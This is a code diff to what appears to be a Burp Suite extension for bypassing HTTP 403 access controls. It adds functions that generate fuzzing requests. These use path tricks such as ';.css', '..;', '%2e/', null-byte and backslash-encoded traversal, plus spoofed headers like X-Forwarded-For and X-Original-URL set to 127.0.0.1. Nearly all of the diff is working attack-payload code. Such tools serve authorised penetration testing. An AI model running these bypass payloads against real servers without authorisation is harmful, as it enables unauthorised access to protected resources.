@@ -80,6 +80,8 @@ public class BypassMain implements IContextMenuFactory {
 
         baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target + ".json", null));
 
+        baseRequestList.add(new BaseRequest("GET",   prefix + "/" + target + ";.css", null));
+
         baseRequestList.add(new BaseRequest("TRACE",   prefix + "/" + target, null));
 
         headers.put("X-Host", "127.0.0.1");
@@ -207,7 +209,165 @@ public class BypassMain implements IContextMenuFactory {
 
     }
 
+    public List<BaseRequest> make_payload_v2(String path) {
+        path = path.substring(1);
 
+        Boolean isEnd = false;
+
+        if(path.endsWith("/")) {
+            path = path.substring(0, path.length()-1);
+            isEnd = true;
+        }
+        String[] paths = path.split("/");
+
+        List<BaseRequest> allRequests = new ArrayList();
+
+        if(isEnd) {
+            allRequests.addAll(make_suffix_v2(path));
+            allRequests.addAll(make_suffix_v2(path + "/"));
+        } else {
+            allRequests.addAll(make_suffix_v2(path));
+        }
+
+        // 对前置节点进行FUZZ
+        if( paths.length > 1) {
+            int paths_len = paths.length;
+            if (isEnd) {
+                allRequests.addAll(make_prefix_v2(paths, paths_len, "/"));
+            } else {
+                allRequests.addAll(make_prefix_v2(paths, paths_len, ""));
+            }
+        }
+
+        return allRequests;
+
+    }
+
+    public List<BaseRequest> make_suffix_v2(String path) {
+        List<BaseRequest> baseRequestList = new ArrayList();
+        Map<String, String> headers = new HashMap();
+
+
+        baseRequestList.add(new BaseRequest("GET",  "/" + path + ".js", null));
+        baseRequestList.add(new BaseRequest("GET",  "/" + path + ".css", null));
+        baseRequestList.add(new BaseRequest("GET",  "/" + path + ".json", null));
+        baseRequestList.add(new BaseRequest("GET",   "/" + path + ".html", null));
+        baseRequestList.add(new BaseRequest("GET",   "/" + path + ";.css", null));
+        baseRequestList.add(new BaseRequest("GET",   "/" + path + ";.js", null));
+        baseRequestList.add(new BaseRequest("GET",   "/" + path + "/.", null));
+        baseRequestList.add(new BaseRequest("GET",   "/" + path + "/", null));
+        baseRequestList.add(new BaseRequest("GET",   "/" + path + "/./", null));
+        baseRequestList.add(new BaseRequest("GET",   "/" + path + "%20", null));
+        baseRequestList.add(new BaseRequest("GET",   "/" + path + "%09", null));
+        baseRequestList.add(new BaseRequest("GET",   "/" + path + "?", null));
+        baseRequestList.add(new BaseRequest("GET",   "/" + path + "?error", null));
+        baseRequestList.add(new BaseRequest("GET",   "/" + path + "#", null));
+        baseRequestList.add(new BaseRequest("GET",   "/" + path + "/*", null));
+        baseRequestList.add(new BaseRequest("GET",   "/" + path + "%26", null));
+
+
+        headers.put("X-Custom-IP-Authorization", "127.0.0.1");
+        headers.put("X-Forwarded-For", "127.0.0.1");
+        headers.put("X-Client-IP", "127.0.0.1");
+        headers.put("X-Remote-Addr", "127.0.0.1");
+        headers.put("X-Originating-IP", "127.0.0.1");
+        headers.put("Referer", "http://127.0.0.1");
+        baseRequestList.add(new BaseRequest("GET",   "/" + path, (Map<String, String>) ((HashMap<String, String>) headers).clone()));
+        headers.clear();
+
+        headers.put("X-Original-URL", path);
+        baseRequestList.add(new BaseRequest("GET",   "/" + path, (Map<String, String>) ((HashMap<String, String>) headers).clone()));
+        headers.clear();
+
+        headers.put("X-Forwarded-For", "http://127.0.0.1");
+        baseRequestList.add(new BaseRequest("GET",   "/" + path, (Map<String, String>) ((HashMap<String, String>) headers).clone()));
+        headers.clear();
+
+        headers.put("X-Forwarded-For", "127.0.0.1:80");
+        baseRequestList.add(new BaseRequest("GET",   "/" + path, (Map<String, String>) ((HashMap<String, String>) headers).clone()));
+        headers.clear();
+
+        headers.put("X-Host", "127.0.0.1");
+        baseRequestList.add(new BaseRequest("GET",   "/" + path, (Map<String, String>) ((HashMap<String, String>) headers).clone()));
+        headers.clear();
+
+        return baseRequestList;
+
+    }
+
+    public List<BaseRequest> make_prefix_v2(String[] paths, int paths_len, String end) {
+        List<BaseRequest> baseRequestList = new ArrayList();
+
+        for (int i=0; i < paths_len; i++) {
+            String _target = paths[i];
+            String new_path = "";
+
+            paths[i] = URLParamEncoder.encode(_target);
+            new_path = StringUtils.join(paths, "/") + end;
+            baseRequestList.add(new BaseRequest("GET",   "/" + new_path, null));
+
+            paths[i] = _target + ";";
+            new_path = StringUtils.join(paths, "/") + end;
+            baseRequestList.add(new BaseRequest("GET",   "/" + new_path, null));
+
+            paths[i] = _target + "/..;";
+            new_path = StringUtils.join(paths, "/") + end;
+            baseRequestList.add(new BaseRequest("GET",   "/" + new_path, null));
+
+            paths[i] = "images;/../" + _target;
+            new_path = StringUtils.join(paths, "/") + end;
+            baseRequestList.add(new BaseRequest("GET",   "/" + new_path, null));
+
+            paths[i] = "%2e/" + _target;
+            new_path = StringUtils.join(paths, "/") + end;
+            baseRequestList.add(new BaseRequest("GET",   "/" + new_path, null));
+
+            paths[i] = ";/" + _target;
+            new_path = StringUtils.join(paths, "/") + end;
+            baseRequestList.add(new BaseRequest("GET",   "/" + new_path, null));
+
+            paths[i] = "./" + _target;
+            new_path = StringUtils.join(paths, "/") + end;
+            baseRequestList.add(new BaseRequest("GET",   "/" + new_path, null));
+
+            paths[i] = "/" + _target;
+            new_path = StringUtils.join(paths, "/") + end;
+            baseRequestList.add(new BaseRequest("GET",   "/" + new_path, null));
+
+            paths[i] = _target + "%20";
+            new_path = StringUtils.join(paths, "/") + end;
+            baseRequestList.add(new BaseRequest("GET",   "/" + new_path, null));
+
+            paths[i] = _target + "%09";
+            new_path = StringUtils.join(paths, "/") + end;
+            baseRequestList.add(new BaseRequest("GET",   "/" + new_path, null));
+
+            paths[i] = ".;/" + _target;
+            new_path = StringUtils.join(paths, "/") + end;
+            baseRequestList.add(new BaseRequest("GET",   "/" + new_path, null));
+
+            paths[i] = "..%00/" + _target;
+            new_path = StringUtils.join(paths, "/") + end;
+            baseRequestList.add(new BaseRequest("GET",   "/" + new_path, null));
+
+            paths[i] = "..%0d/" + _target;
+            new_path = StringUtils.join(paths, "/") + end;
+            baseRequestList.add(new BaseRequest("GET",   "/" + new_path, null));
+
+            paths[i] = "..%5c/" + _target;
+            new_path = StringUtils.join(paths, "/") + end;
+            baseRequestList.add(new BaseRequest("GET",   "/" + new_path, null));
+
+            paths[i] = "#/../" + _target;
+            new_path = StringUtils.join(paths, "/") + end;
+            baseRequestList.add(new BaseRequest("GET",   "/" + new_path, null));
+
+            paths[i] = _target;
+
+        }
+
+        return baseRequestList;
+    }
     class Run_request implements Runnable {
         private BaseRequest baseRequest;
         private String old_path;
@@ -305,7 +465,7 @@ public class BypassMain implements IContextMenuFactory {
                             IResponseInfo response = Utils.helpers.analyzeResponse(iHttpRequestResponse.getResponse());
 
                             List<BaseRequest> allRequests;
-                            allRequests = make_payload(old_path);
+                            allRequests = make_payload_v2(old_path);
 
                             int thread_num = Utils.panel.getThreadNum();
 
